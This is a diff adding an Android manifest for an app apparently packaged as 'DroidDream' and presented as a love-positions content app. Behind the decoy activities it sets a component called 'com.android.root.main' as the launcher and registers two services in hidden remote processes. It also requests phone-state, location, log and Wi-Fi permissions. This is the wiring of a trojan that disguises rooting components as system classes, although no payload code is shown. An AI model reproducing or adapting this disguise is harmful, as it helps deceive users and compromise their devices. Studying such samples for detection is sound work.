@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.droiddream.lovePositions">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:label="@string/app_name" android:name="com.apk.com.lovePositions.MainActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.apk.com.lovePositions.AllActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.apk.com.lovePositions.ViewActivity" android:screenOrientation="portrait"/>
+        <activity android:name="com.apk.com.lovePositions.ContentActivity" android:screenOrientation="portrait"/>
+        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14cd948f6aec6e"/>
+        <meta-data android:name="UMENG_APPKEY" android:value="4cd9488f3ea7a37b1f00cea8"/>
+        <activity android:name="com.android.root.main">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.root.Setting" android:process=":remote"/>
+        <service android:name="com.android.root.AlarmReceiver" android:process=":remote2"/>
+    </application>
+</manifest>
